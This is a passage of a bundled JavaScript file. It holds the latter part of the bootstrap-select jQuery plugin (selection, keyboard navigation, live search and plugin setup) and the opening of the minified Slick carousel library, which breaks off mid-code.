              if (version.major < 4 || display === 'static') {
                containerPosition.top = pos.top - containerPos.top + actualHeight;
                containerPosition.left = pos.left - containerPos.left;
              }
  
              containerPosition.width = $element[0].offsetWidth;
  
              that.$bsContainer.css(containerPosition);
            };
  
        this.$button.on('click.bs.dropdown.data-api', function () {
          if (that.isDisabled()) {
            return;
          }
  
          getPlacement(that.$newElement);
  
          that.$bsContainer
            .appendTo(that.options.container)
            .toggleClass(classNames.SHOW, !that.$button.hasClass(classNames.SHOW))
            .append(that.$menu);
        });
  
        $(window)
          .off('resize' + EVENT_KEY + '.' + this.selectId + ' scroll' + EVENT_KEY + '.' + this.selectId)
          .on('resize' + EVENT_KEY + '.' + this.selectId + ' scroll' + EVENT_KEY + '.' + this.selectId, function () {
            var isActive = that.$newElement.hasClass(classNames.SHOW);
  
            if (isActive) getPlacement(that.$newElement);
          });
  
        this.$element.on('hide' + EVENT_KEY, function () {
          that.$menu.data('height', that.$menu.height());
          that.$bsContainer.detach();
        });
      },
  
      setOptionStatus: function () {
        var that = this;
  
        that.noScroll = false;
  
        if (that.selectpicker.view.visibleElements && that.selectpicker.view.visibleElements.length) {
          for (var i = 0; i < that.selectpicker.view.visibleElements.length; i++) {
            var liData = that.selectpicker.current.data[i + that.selectpicker.view.position0],
                option = liData.option;
  
            if (option) {
              that.setDisabled(
                liData.index,
                liData.disabled
              );
  
              that.setSelected(
                liData.index,
                option.selected
              );
            }
          }
        }
      },
  
      /**
       * @param {number} index - the index of the option that is being changed
       * @param {boolean} selected - true if the option is being selected, false if being deselected
       */
      setSelected: function (index, selected) {
        var li = this.selectpicker.main.elements[index],
            liData = this.selectpicker.main.data[index],
            activeIndexIsSet = this.activeIndex !== undefined,
            thisIsActive = this.activeIndex === index,
            prevActive,
            a,
            // if current option is already active
            // OR
            // if the current option is being selected, it's NOT multiple, and
            // activeIndex is undefined:
            //  - when the menu is first being opened, OR
            //  - after a search has been performed, OR
            //  - when retainActive is false when selecting a new option (i.e. index of the newly selected option is not the same as the current activeIndex)
            keepActive = thisIsActive || (selected && !this.multiple && !activeIndexIsSet);
  
        liData.selected = selected;
  
        a = li.firstChild;
  
        if (selected) {
          this.selectedIndex = index;
        }
  
        li.classList.toggle('selected', selected);
        li.classList.toggle('active', keepActive);
  
        if (keepActive) {
          this.selectpicker.view.currentActive = li;
          this.activeIndex = index;
        }
  
        if (a) {
          a.classList.toggle('selected', selected);
          a.classList.toggle('active', keepActive);
          a.setAttribute('aria-selected', selected);
        }
  
        if (!keepActive) {
          if (!activeIndexIsSet && selected && this.prevActiveIndex !== undefined) {
            prevActive = this.selectpicker.main.elements[this.prevActiveIndex];
  
            prevActive.classList.remove('active');
            if (prevActive.firstChild) {
              prevActive.firstChild.classList.remove('active');
            }
          }
        }
      },
  
      /**
       * @param {number} index - the index of the option that is being disabled
       * @param {boolean} disabled - true if the option is being disabled, false if being enabled
       */
      setDisabled: function (index, disabled) {
        var li = this.selectpicker.main.elements[index],
            a;
  
        this.selectpicker.main.data[index].disabled = disabled;
  
        a = li.firstChild;
  
        li.classList.toggle(classNames.DISABLED, disabled);
  
        if (a) {
          if (version.major === '4') a.classList.toggle(classNames.DISABLED, disabled);
  
          a.setAttribute('aria-disabled', disabled);
  
          if (disabled) {
            a.setAttribute('tabindex', -1);
          } else {
            a.setAttribute('tabindex', 0);
          }
        }
      },
  
      isDisabled: function () {
        return this.$element[0].disabled;
      },
  
      checkDisabled: function () {
        var that = this;
  
        if (this.isDisabled()) {
          this.$newElement[0].classList.add(classNames.DISABLED);
          this.$button.addClass(classNames.DISABLED).attr('tabindex', -1).attr('aria-disabled', true);
        } else {
          if (this.$button[0].classList.contains(classNames.DISABLED)) {
            this.$newElement[0].classList.remove(classNames.DISABLED);
            this.$button.removeClass(classNames.DISABLED).attr('aria-disabled', false);
          }
  
          if (this.$button.attr('tabindex') == -1 && !this.$element.data('tabindex')) {
            this.$button.removeAttr('tabindex');
          }
        }
  
        this.$button.on('click', function () {
          return !that.isDisabled();
        });
      },
  
      togglePlaceholder: function () {
        // much faster than calling $.val()
        var element = this.$element[0],
            selectedIndex = element.selectedIndex,
            nothingSelected = selectedIndex === -1;
  
        if (!nothingSelected && !element.options[selectedIndex].value) nothingSelected = true;
  
        this.$button.toggleClass('bs-placeholder', nothingSelected);
      },
  
      tabIndex: function () {
        if (this.$element.data('tabindex') !== this.$element.attr('tabindex') &&
          (this.$element.attr('tabindex') !== -98 && this.$element.attr('tabindex') !== '-98')) {
          this.$element.data('tabindex', this.$element.attr('tabindex'));
          this.$button.attr('tabindex', this.$element.data('tabindex'));
        }
  
        this.$element.attr('tabindex', -98);
      },
  
      clickListener: function () {
        var that = this,
            $document = $(document);
  
        $document.data('spaceSelect', false);
  
        this.$button.on('keyup', function (e) {
          if (/(32)/.test(e.keyCode.toString(10)) && $document.data('spaceSelect')) {
            e.preventDefault();
            $document.data('spaceSelect', false);
          }
        });
  
        this.$newElement.on('show.bs.dropdown', function () {
          if (version.major > 3 && !that.dropdown) {
            that.dropdown = that.$button.data('bs.dropdown');
            that.dropdown._menu = that.$menu[0];
          }
        });
  
        this.$button.on('click.bs.dropdown.data-api', function () {
          if (!that.$newElement.hasClass(classNames.SHOW)) {
            that.setSize();
          }
        });
  
        function setFocus () {
          if (that.options.liveSearch) {
            that.$searchbox.trigger('focus');
          } else {
            that.$menuInner.trigger('focus');
          }
        }
  
        function checkPopperExists () {
          if (that.dropdown && that.dropdown._popper && that.dropdown._popper.state.isCreated) {
            setFocus();
          } else {
            requestAnimationFrame(checkPopperExists);
          }
        }
  
        this.$element.on('shown' + EVENT_KEY, function () {
          if (that.$menuInner[0].scrollTop !== that.selectpicker.view.scrollTop) {
            that.$menuInner[0].scrollTop = that.selectpicker.view.scrollTop;
          }
  
          if (version.major > 3) {
            requestAnimationFrame(checkPopperExists);
          } else {
            setFocus();
          }
        });
  
        this.$menuInner.on('click', 'li a', function (e, retainActive) {
          var $this = $(this),
              position0 = that.isVirtual() ? that.selectpicker.view.position0 : 0,
              clickedData = that.selectpicker.current.data[$this.parent().index() + position0],
              clickedIndex = clickedData.index,
              prevValue = getSelectValues(that.$element[0]),
              prevIndex = that.$element.prop('selectedIndex'),
              triggerChange = true;
  
          // Don't close on multi choice menu
          if (that.multiple && that.options.maxOptions !== 1) {
            e.stopPropagation();
          }
  
          e.preventDefault();
  
          // Don't run if the select is disabled
          if (!that.isDisabled() && !$this.parent().hasClass(classNames.DISABLED)) {
            var $options = that.$element.find('option'),
                option = clickedData.option,
                $option = $(option),
                state = option.selected,
                $optgroup = $option.parent('optgroup'),
                $optgroupOptions = $optgroup.find('option'),
                maxOptions = that.options.maxOptions,
                maxOptionsGrp = $optgroup.data('maxOptions') || false;
  
            if (clickedIndex === that.activeIndex) retainActive = true;
  
            if (!retainActive) {
              that.prevActiveIndex = that.activeIndex;
              that.activeIndex = undefined;
            }
  
            if (!that.multiple) { // Deselect all others if not multi select box
              $options.prop('selected', false);
              option.selected = true;
              that.setSelected(clickedIndex, true);
            } else { // Toggle the one we have chosen if we are multi select.
              option.selected = !state;
  
              that.setSelected(clickedIndex, !state);
              $this.trigger('blur');
  
              if (maxOptions !== false || maxOptionsGrp !== false) {
                var maxReached = maxOptions < $options.filter(':selected').length,
                    maxReachedGrp = maxOptionsGrp < $optgroup.find('option:selected').length;
  
                if ((maxOptions && maxReached) || (maxOptionsGrp && maxReachedGrp)) {
                  if (maxOptions && maxOptions == 1) {
                    $options.prop('selected', false);
                    $option.prop('selected', true);
  
                    for (var i = 0; i < $options.length; i++) {
                      that.setSelected(i, false);
                    }
  
                    that.setSelected(clickedIndex, true);
                  } else if (maxOptionsGrp && maxOptionsGrp == 1) {
                    $optgroup.find('option:selected').prop('selected', false);
                    $option.prop('selected', true);
  
                    for (var i = 0; i < $optgroupOptions.length; i++) {
                      var option = $optgroupOptions[i];
                      that.setSelected($options.index(option), false);
                    }
  
                    that.setSelected(clickedIndex, true);
                  } else {
                    var maxOptionsText = typeof that.options.maxOptionsText === 'string' ? [that.options.maxOptionsText, that.options.maxOptionsText] : that.options.maxOptionsText,
                        maxOptionsArr = typeof maxOptionsText === 'function' ? maxOptionsText(maxOptions, maxOptionsGrp) : maxOptionsText,
                        maxTxt = maxOptionsArr[0].replace('{n}', maxOptions),
                        maxTxtGrp = maxOptionsArr[1].replace('{n}', maxOptionsGrp),
                        $notify = $('<div class="notify"></div>');
                    // If {var} is set in array, replace it
                    /** @deprecated */
                    if (maxOptionsArr[2]) {
                      maxTxt = maxTxt.replace('{var}', maxOptionsArr[2][maxOptions > 1 ? 0 : 1]);
                      maxTxtGrp = maxTxtGrp.replace('{var}', maxOptionsArr[2][maxOptionsGrp > 1 ? 0 : 1]);
                    }
  
                    $option.prop('selected', false);
  
                    that.$menu.append($notify);
  
                    if (maxOptions && maxReached) {
                      $notify.append($('<div>' + maxTxt + '</div>'));
                      triggerChange = false;
                      that.$element.trigger('maxReached' + EVENT_KEY);
                    }
  
                    if (maxOptionsGrp && maxReachedGrp) {
                      $notify.append($('<div>' + maxTxtGrp + '</div>'));
                      triggerChange = false;
                      that.$element.trigger('maxReachedGrp' + EVENT_KEY);
                    }
  
                    setTimeout(function () {
                      that.setSelected(clickedIndex, false);
                    }, 10);
  
                    $notify.delay(750).fadeOut(300, function () {
                      $(this).remove();
                    });
                  }
                }
              }
            }
  
            if (!that.multiple || (that.multiple && that.options.maxOptions === 1)) {
              that.$button.trigger('focus');
            } else if (that.options.liveSearch) {
              that.$searchbox.trigger('focus');
            }
  
            // Trigger select 'change'
            if (triggerChange) {
              if ((prevValue != getSelectValues(that.$element[0]) && that.multiple) || (prevIndex != that.$element.prop('selectedIndex') && !that.multiple)) {
                // $option.prop('selected') is current option state (selected/unselected). prevValue is the value of the select prior to being changed.
                changedArguments = [option.index, $option.prop('selected'), prevValue];
                that.$element
                  .triggerNative('change');
              }
            }
          }
        });
  
        this.$menu.on('click', 'li.' + classNames.DISABLED + ' a, .' + classNames.POPOVERHEADER + ', .' + classNames.POPOVERHEADER + ' :not(.close)', function (e) {
          if (e.currentTarget == this) {
            e.preventDefault();
            e.stopPropagation();
            if (that.options.liveSearch && !$(e.target).hasClass('close')) {
              that.$searchbox.trigger('focus');
            } else {
              that.$button.trigger('focus');
            }
          }
        });
  
        this.$menuInner.on('click', '.divider, .dropdown-header', function (e) {
          e.preventDefault();
          e.stopPropagation();
          if (that.options.liveSearch) {
            that.$searchbox.trigger('focus');
          } else {
            that.$button.trigger('focus');
          }
        });
  
        this.$menu.on('click', '.' + classNames.POPOVERHEADER + ' .close', function () {
          that.$button.trigger('click');
        });
  
        this.$searchbox.on('click', function (e) {
          e.stopPropagation();
        });
  
        this.$menu.on('click', '.actions-btn', function (e) {
          if (that.options.liveSearch) {
            that.$searchbox.trigger('focus');
          } else {
            that.$button.trigger('focus');
          }
  
          e.preventDefault();
          e.stopPropagation();
  
          if ($(this).hasClass('bs-select-all')) {
            that.selectAll();
          } else {
            that.deselectAll();
          }
        });
  
        this.$element
          .on('change' + EVENT_KEY, function () {
            that.render();
            that.$element.trigger('changed' + EVENT_KEY, changedArguments);
            changedArguments = null;
          })
          .on('focus' + EVENT_KEY, function () {
            if (!that.options.mobile) that.$button.trigger('focus');
          });
      },
  
      liveSearchListener: function () {
        var that = this,
            noResults = document.createElement('li');
  
        this.$button.on('click.bs.dropdown.data-api', function () {
          if (!!that.$searchbox.val()) {
            that.$searchbox.val('');
          }
        });
  
        this.$searchbox.on('click.bs.dropdown.data-api focus.bs.dropdown.data-api touchend.bs.dropdown.data-api', function (e) {
          e.stopPropagation();
        });
  
        this.$searchbox.on('input propertychange', function () {
          var searchValue = that.$searchbox.val();
  
          that.selectpicker.search.elements = [];
          that.selectpicker.search.data = [];
  
          if (searchValue) {
            var i,
                searchMatch = [],
                q = searchValue.toUpperCase(),
                cache = {},
                cacheArr = [],
                searchStyle = that._searchStyle(),
                normalizeSearch = that.options.liveSearchNormalize;
  
            if (normalizeSearch) q = normalizeToBase(q);
  
            that._$lisSelected = that.$menuInner.find('.selected');
  
            for (var i = 0; i < that.selectpicker.main.data.length; i++) {
              var li = that.selectpicker.main.data[i];
  
              if (!cache[i]) {
                cache[i] = stringSearch(li, q, searchStyle, normalizeSearch);
              }
  
              if (cache[i] && li.headerIndex !== undefined && cacheArr.indexOf(li.headerIndex) === -1) {
                if (li.headerIndex > 0) {
                  cache[li.headerIndex - 1] = true;
                  cacheArr.push(li.headerIndex - 1);
                }
  
                cache[li.headerIndex] = true;
                cacheArr.push(li.headerIndex);
  
                cache[li.lastIndex + 1] = true;
              }
  
              if (cache[i] && li.type !== 'optgroup-label') cacheArr.push(i);
            }
  
            for (var i = 0, cacheLen = cacheArr.length; i < cacheLen; i++) {
              var index = cacheArr[i],
                  prevIndex = cacheArr[i - 1],
                  li = that.selectpicker.main.data[index],
                  liPrev = that.selectpicker.main.data[prevIndex];
  
              if (li.type !== 'divider' || (li.type === 'divider' && liPrev && liPrev.type !== 'divider' && cacheLen - 1 !== i)) {
                that.selectpicker.search.data.push(li);
                searchMatch.push(that.selectpicker.main.elements[index]);
              }
            }
  
            that.activeIndex = undefined;
            that.noScroll = true;
            that.$menuInner.scrollTop(0);
            that.selectpicker.search.elements = searchMatch;
            that.createView(true);
  
            if (!searchMatch.length) {
              noResults.className = 'no-results';
              noResults.innerHTML = that.options.noneResultsText.replace('{0}', '"' + htmlEscape(searchValue) + '"');
              that.$menuInner[0].firstChild.appendChild(noResults);
            }
          } else {
            that.$menuInner.scrollTop(0);
            that.createView(false);
          }
        });
      },
  
      _searchStyle: function () {
        return this.options.liveSearchStyle || 'contains';
      },
  
      val: function (value) {
        if (typeof value !== 'undefined') {
          var prevValue = getSelectValues(this.$element[0]);
  
          changedArguments = [null, null, prevValue];
  
          this.$element
            .val(value)
            .trigger('changed' + EVENT_KEY, changedArguments);
  
          this.render();
  
          changedArguments = null;
  
          return this.$element;
        } else {
          return this.$element.val();
        }
      },
  
      changeAll: function (status) {
        if (!this.multiple) return;
        if (typeof status === 'undefined') status = true;
  
        var element = this.$element[0],
            previousSelected = 0,
            currentSelected = 0,
            prevValue = getSelectValues(element);
  
        element.classList.add('bs-select-hidden');
  
        for (var i = 0, len = this.selectpicker.current.elements.length; i < len; i++) {
          var liData = this.selectpicker.current.data[i],
              option = liData.option;
  
          if (option && !liData.disabled && liData.type !== 'divider') {
            if (liData.selected) previousSelected++;
            option.selected = status;
            if (status) currentSelected++;
          }
        }
  
        element.classList.remove('bs-select-hidden');
  
        if (previousSelected === currentSelected) return;
  
        this.setOptionStatus();
  
        this.togglePlaceholder();
  
        changedArguments = [null, null, prevValue];
  
        this.$element
          .triggerNative('change');
      },
  
      selectAll: function () {
        return this.changeAll(true);
      },
  
      deselectAll: function () {
        return this.changeAll(false);
      },
  
      toggle: function (e) {
        e = e || window.event;
  
        if (e) e.stopPropagation();
  
        this.$button.trigger('click.bs.dropdown.data-api');
      },
  
      keydown: function (e) {
        var $this = $(this),
            isToggle = $this.hasClass('dropdown-toggle'),
            $parent = isToggle ? $this.closest('.dropdown') : $this.closest(Selector.MENU),
            that = $parent.data('this'),
            $items = that.findLis(),
            index,
            isActive,
            liActive,
            activeLi,
            offset,
            updateScroll = false,
            downOnTab = e.which === keyCodes.TAB && !isToggle && !that.options.selectOnTab,
            isArrowKey = REGEXP_ARROW.test(e.which) || downOnTab,
            scrollTop = that.$menuInner[0].scrollTop,
            isVirtual = that.isVirtual(),
            position0 = isVirtual === true ? that.selectpicker.view.position0 : 0;
  
        isActive = that.$newElement.hasClass(classNames.SHOW);
  
        if (
          !isActive &&
          (
            isArrowKey ||
            (e.which >= 48 && e.which <= 57) ||
            (e.which >= 96 && e.which <= 105) ||
            (e.which >= 65 && e.which <= 90)
          )
        ) {
          that.$button.trigger('click.bs.dropdown.data-api');
  
          if (that.options.liveSearch) {
            that.$searchbox.trigger('focus');
            return;
          }
        }
  
        if (e.which === keyCodes.ESCAPE && isActive) {
          e.preventDefault();
          that.$button.trigger('click.bs.dropdown.data-api').trigger('focus');
        }
  
        if (isArrowKey) { // if up or down
          if (!$items.length) return;
  
          // $items.index/.filter is too slow with a large list and no virtual scroll
          index = isVirtual === true ? $items.index($items.filter('.active')) : that.activeIndex;
  
          if (index === undefined) index = -1;
  
          if (index !== -1) {
            liActive = that.selectpicker.current.elements[index + position0];
            liActive.classList.remove('active');
            if (liActive.firstChild) liActive.firstChild.classList.remove('active');
          }
  
          if (e.which === keyCodes.ARROW_UP) { // up
            if (index !== -1) index--;
            if (index + position0 < 0) index += $items.length;
  
            if (!that.selectpicker.view.canHighlight[index + position0]) {
              index = that.selectpicker.view.canHighlight.slice(0, index + position0).lastIndexOf(true) - position0;
              if (index === -1) index = $items.length - 1;
            }
          } else if (e.which === keyCodes.ARROW_DOWN || downOnTab) { // down
            index++;
            if (index + position0 >= that.selectpicker.view.canHighlight.length) index = 0;
  
            if (!that.selectpicker.view.canHighlight[index + position0]) {
              index = index + 1 + that.selectpicker.view.canHighlight.slice(index + position0 + 1).indexOf(true);
            }
          }
  
          e.preventDefault();
  
          var liActiveIndex = position0 + index;
  
          if (e.which === keyCodes.ARROW_UP) { // up
            // scroll to bottom and highlight last option
            if (position0 === 0 && index === $items.length - 1) {
              that.$menuInner[0].scrollTop = that.$menuInner[0].scrollHeight;
  
              liActiveIndex = that.selectpicker.current.elements.length - 1;
            } else {
              activeLi = that.selectpicker.current.data[liActiveIndex];
              offset = activeLi.position - activeLi.height;
  
              updateScroll = offset < scrollTop;
            }
          } else if (e.which === keyCodes.ARROW_DOWN || downOnTab) { // down
            // scroll to top and highlight first option
            if (index === 0) {
              that.$menuInner[0].scrollTop = 0;
  
              liActiveIndex = 0;
            } else {
              activeLi = that.selectpicker.current.data[liActiveIndex];
              offset = activeLi.position - that.sizeInfo.menuInnerHeight;
  
              updateScroll = offset > scrollTop;
            }
          }
  
          liActive = that.selectpicker.current.elements[liActiveIndex];
  
          if (liActive) {
            liActive.classList.add('active');
            if (liActive.firstChild) liActive.firstChild.classList.add('active');
          }
  
          that.activeIndex = that.selectpicker.current.data[liActiveIndex].index;
  
          that.selectpicker.view.currentActive = liActive;
  
          if (updateScroll) that.$menuInner[0].scrollTop = offset;
  
          if (that.options.liveSearch) {
            that.$searchbox.trigger('focus');
          } else {
            $this.trigger('focus');
          }
        } else if (
          (!$this.is('input') && !REGEXP_TAB_OR_ESCAPE.test(e.which)) ||
          (e.which === keyCodes.SPACE && that.selectpicker.keydown.keyHistory)
        ) {
          var searchMatch,
              matches = [],
              keyHistory;
  
          e.preventDefault();
  
          that.selectpicker.keydown.keyHistory += keyCodeMap[e.which];
  
          if (that.selectpicker.keydown.resetKeyHistory.cancel) clearTimeout(that.selectpicker.keydown.resetKeyHistory.cancel);
          that.selectpicker.keydown.resetKeyHistory.cancel = that.selectpicker.keydown.resetKeyHistory.start();
  
          keyHistory = that.selectpicker.keydown.keyHistory;
  
          // if all letters are the same, set keyHistory to just the first character when searching
          if (/^(.)\1+$/.test(keyHistory)) {
            keyHistory = keyHistory.charAt(0);
          }
  
          // find matches
          for (var i = 0; i < that.selectpicker.current.data.length; i++) {
            var li = that.selectpicker.current.data[i],
                hasMatch;
  
            hasMatch = stringSearch(li, keyHistory, 'startsWith', true);
  
            if (hasMatch && that.selectpicker.view.canHighlight[i]) {
              matches.push(li.index);
            }
          }
  
          if (matches.length) {
            var matchIndex = 0;
  
            $items.removeClass('active').find('a').removeClass('active');
  
            // either only one key has been pressed or they are all the same key
            if (keyHistory.length === 1) {
              matchIndex = matches.indexOf(that.activeIndex);
  
              if (matchIndex === -1 || matchIndex === matches.length - 1) {
                matchIndex = 0;
              } else {
                matchIndex++;
              }
            }
  
            searchMatch = matches[matchIndex];
  
            activeLi = that.selectpicker.main.data[searchMatch];
  
            if (scrollTop - activeLi.position > 0) {
              offset = activeLi.position - activeLi.height;
              updateScroll = true;
            } else {
              offset = activeLi.position - that.sizeInfo.menuInnerHeight;
              // if the option is already visible at the current scroll position, just keep it the same
              updateScroll = activeLi.position > scrollTop + that.sizeInfo.menuInnerHeight;
            }
  
            liActive = that.selectpicker.main.elements[searchMatch];
            liActive.classList.add('active');
            if (liActive.firstChild) liActive.firstChild.classList.add('active');
            that.activeIndex = matches[matchIndex];
  
            liActive.firstChild.focus();
  
            if (updateScroll) that.$menuInner[0].scrollTop = offset;
  
            $this.trigger('focus');
          }
        }
  
        // Select focused option if "Enter", "Spacebar" or "Tab" (when selectOnTab is true) are pressed inside the menu.
        if (
          isActive &&
          (
            (e.which === keyCodes.SPACE && !that.selectpicker.keydown.keyHistory) ||
            e.which === keyCodes.ENTER ||
            (e.which === keyCodes.TAB && that.options.selectOnTab)
          )
        ) {
          if (e.which !== keyCodes.SPACE) e.preventDefault();
  
          if (!that.options.liveSearch || e.which !== keyCodes.SPACE) {
            that.$menuInner.find('.active a').trigger('click', true); // retain active class
            $this.trigger('focus');
  
            if (!that.options.liveSearch) {
              // Prevent screen from scrolling if the user hits the spacebar
              e.preventDefault();
              // Fixes spacebar selection of dropdown items in FF & IE
              $(document).data('spaceSelect', true);
            }
          }
        }
      },
  
      mobile: function () {
        this.$element[0].classList.add('mobile-device');
      },
  
      refresh: function () {
        // update options if data attributes have been changed
        var config = $.extend({}, this.options, this.$element.data());
        this.options = config;
  
        this.checkDisabled();
        this.setStyle();
        this.render();
        this.createLi();
        this.setWidth();
  
        this.setSize(true);
  
        this.$element.trigger('refreshed' + EVENT_KEY);
      },
  
      hide: function () {
        this.$newElement.hide();
      },
  
      show: function () {
        this.$newElement.show();
      },
  
      remove: function () {
        this.$newElement.remove();
        this.$element.remove();
      },
  
      destroy: function () {
        this.$newElement.before(this.$element).remove();
  
        if (this.$bsContainer) {
          this.$bsContainer.remove();
        } else {
          this.$menu.remove();
        }
  
        this.$element
          .off(EVENT_KEY)
          .removeData('selectpicker')
          .removeClass('bs-select-hidden selectpicker');
  
        $(window).off(EVENT_KEY + '.' + this.selectId);
      }
    };
  
    // SELECTPICKER PLUGIN DEFINITION
    // ==============================
    function Plugin (option) {
      // get the args of the outer function..
      var args = arguments;
      // The arguments of the function are explicitly re-defined from the argument list, because the shift causes them
      // to get lost/corrupted in android 2.3 and IE9 #715 #775
      var _option = option;
  
      [].shift.apply(args);
  
      // if the version was not set successfully
      if (!version.success) {
        // try to retreive it again
        try {
          version.full = ($.fn.dropdown.Constructor.VERSION || '').split(' ')[0].split('.');
        } catch (err) {
          // fall back to use BootstrapVersion if set
          if (Selectpicker.BootstrapVersion) {
            version.full = Selectpicker.BootstrapVersion.split(' ')[0].split('.');
          } else {
            version.full = [version.major, '0', '0'];
  
            console.warn(
              'There was an issue retrieving Bootstrap\'s version. ' +
              'Ensure Bootstrap is being loaded before bootstrap-select and there is no namespace collision. ' +
              'If loading Bootstrap asynchronously, the version may need to be manually specified via $.fn.selectpicker.Constructor.BootstrapVersion.',
              err
            );
          }
        }
  
        version.major = version.full[0];
        version.success = true;
      }
  
      if (version.major === '4') {
        // some defaults need to be changed if using Bootstrap 4
        // check to see if they have already been manually changed before forcing them to update
        var toUpdate = [];
  
        if (Selectpicker.DEFAULTS.style === classNames.BUTTONCLASS) toUpdate.push({ name: 'style', className: 'BUTTONCLASS' });
        if (Selectpicker.DEFAULTS.iconBase === classNames.ICONBASE) toUpdate.push({ name: 'iconBase', className: 'ICONBASE' });
        if (Selectpicker.DEFAULTS.tickIcon === classNames.TICKICON) toUpdate.push({ name: 'tickIcon', className: 'TICKICON' });
  
        classNames.DIVIDER = 'dropdown-divider';
        classNames.SHOW = 'show';
        classNames.BUTTONCLASS = 'btn-light';
        classNames.POPOVERHEADER = 'popover-header';
        classNames.ICONBASE = '';
        classNames.TICKICON = 'bs-ok-default';
  
        for (var i = 0; i < toUpdate.length; i++) {
          var option = toUpdate[i];
          Selectpicker.DEFAULTS[option.name] = classNames[option.className];
        }
      }
  
      var value;
      var chain = this.each(function () {
        var $this = $(this);
        if ($this.is('select')) {
          var data = $this.data('selectpicker'),
              options = typeof _option == 'object' && _option;
  
          if (!data) {
            var dataAttributes = $this.data();
  
            for (var dataAttr in dataAttributes) {
              if (dataAttributes.hasOwnProperty(dataAttr) && $.inArray(dataAttr, DISALLOWED_ATTRIBUTES) !== -1) {
                delete dataAttributes[dataAttr];
              }
            }
  
            var config = $.extend({}, Selectpicker.DEFAULTS, $.fn.selectpicker.defaults || {}, dataAttributes, options);
            config.template = $.extend({}, Selectpicker.DEFAULTS.template, ($.fn.selectpicker.defaults ? $.fn.selectpicker.defaults.template : {}), dataAttributes.template, options.template);
            $this.data('selectpicker', (data = new Selectpicker(this, config)));
          } else if (options) {
            for (var i in options) {
              if (options.hasOwnProperty(i)) {
                data.options[i] = options[i];
              }
            }
          }
  
          if (typeof _option == 'string') {
            if (data[_option] instanceof Function) {
              value = data[_option].apply(data, args);
            } else {
              value = data.options[_option];
            }
          }
        }
      });
  
      if (typeof value !== 'undefined') {
        // noinspection JSUnusedAssignment
        return value;
      } else {
        return chain;
      }
    }
  
    var old = $.fn.selectpicker;
    $.fn.selectpicker = Plugin;
    $.fn.selectpicker.Constructor = Selectpicker;
  
    // SELECTPICKER NO CONFLICT
    // ========================
    $.fn.selectpicker.noConflict = function () {
      $.fn.selectpicker = old;
      return this;
    };
  
    $(document)
      .off('keydown.bs.dropdown.data-api')
      .on('keydown' + EVENT_KEY, '.bootstrap-select [data-toggle="dropdown"], .bootstrap-select [role="listbox"], .bootstrap-select .bs-searchbox input', Selectpicker.prototype.keydown)
      .on('focusin.modal', '.bootstrap-select [data-toggle="dropdown"], .bootstrap-select [role="listbox"], .bootstrap-select .bs-searchbox input', function (e) {
        e.stopPropagation();
      });
  
    // SELECTPICKER DATA-API
    // =====================
    $(window).on('load' + EVENT_KEY + '.data-api', function () {
      $('.selectpicker').each(function () {
        var $selectpicker = $(this);
        Plugin.call($selectpicker, $selectpicker.data());
      })
    });
  })(jQuery);
  


!function(i){"use strict";"function"==typeof define&&define.amd?define(["jquery"],i):"undefined"!=typeof exports?module.exports=i(require("jquery")):i(jQuery)}(function(i){"use strict";var e=window.Slick||{};(e=function(){var e=0;return function(t,o){var s,n=this;n.defaults={accessibility:!0,adaptiveHeight:!1,appendArrows:i(t),appendDots:i(t),arrows:!0,asNavFor:null,prevArrow:'<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',nextArrow:'<button class="slick-next" aria-label="Next" type="button">Next</button>',autoplay:!1,autoplaySpeed:3e3,centerMode:!1,centerPadding:"50px",cssEase:"ease",customPaging:function(e,t){return i('<button type="button" />').text(t+1)},dots:!1,dotsClass:"slick-dots",draggable:!0,easing:"linear",edgeFriction:.35,fade:!1,focusOnSelect:!1,focusOnChange:!1,infinite:!0,initialSlide:0,lazyLoad:"ondemand",mobileFirst:!1,pauseOnHover:!0,pauseOnFocus:!0,pauseOnDotsHover:!1,respondTo:"window",responsive:null,rows:1,rtl:!1,slide:"",slidesPerRow:1,slidesToShow:1,slidesToScroll:1,speed:500,swipe:!0,swipeToSlide:!1,touchMove:!0,touchThreshold:5,useCSS:!0,useTransform:!0,variableWidth:!1,vertical:!1,verticalSwiping:!1,waitForAnimate:!0,zIndex:1e3},n.initials={animating:!1,dragging:!1,autoPlayTimer:null,currentDirection:0,currentLeft:null,currentSlide:0,direction:1,$dots:null,listWidth:null,listHeight:null,loadIndex:0,$nextArrow:null,$prevArrow:null,scrolling:!1,slideCount:null,slideWidth:null,$slideTrack:null,$slides:null,sliding:!1,slideOffset:0,swipeLeft:null,swiping:!1,$list:null,touchObject:{},transformsEnabled:!1,unslicked:!1},i.extend(n,n.initials),n.activeBreakpoint=null,n.animType=null,n.animProp=null,n.breakpoints=[],n.breakpointSettings=[],n.cssTransitions=!1,n.focussed=!1,n.interrupted=!1,n.hidden="hidden",n.paused=!0,n.positionProp=null,n.respondTo=null,n.rowCount=1,n.shouldClick=!0,n.$slider=i(t),n.$slidesCache=null,n.transformType=null,n.transitionType=null,n.visibilityChange="visibilitychange",n.windowWidth=0,n.windowTimer=null,s=i(t).data("slick")||{},n.options=i.extend({},n.defaults,o,s),n.currentSlide=n.options.initialSlide,n.originalSettings=n.options,void 0!==document.mozHidden?(n.hidden="mozHidden",n.visibilityChange="mozvisibilitychange"):void 0!==document.webkitHidden&&(n.hidden="webkitHidden",n.visibilityChange="webkitvisibilitychange"),n.autoPlay=i.proxy(n.autoPlay,n),n.autoPlayClear=i.proxy(n.autoPlayClear,n),n.autoPlayIterator=i.proxy(n.autoPlayIterator,n),n.changeSlide=i.proxy(n.changeSlide,n),n.clickHandler=i.proxy(n.clickHandler,n),n.selectHandler=i.proxy(n.selectHandler,n),n.setPosition=i.proxy(n.setPosition,n),n.swipeHandler=i.proxy(n.swipeHandler,n),n.dragHandler=i.proxy(n.dragHandler,n),n.keyHandler=i.proxy(n.keyHandler,n),n.instanceUid=e++,n.htmlExpr=/^(?:\s*(<[\w\W]+>)[^>]*)$/,n.registerBreakpoints(),n.init(!0)}}()).prototype.activateADA=function(){this.$slideTrack.find(".slick-active").attr({"aria-hidden":"false"}).find("a, input, button, select").attr({tabindex:"0"})},e.prototype.addSlide=e.prototype.slickAdd=function(e,t,o){var s=this;if("boolean"==typeof t)o=t,t=null;else if(t<0||t>=s.slideCount)return!1;s.unload(),"number"==typeof 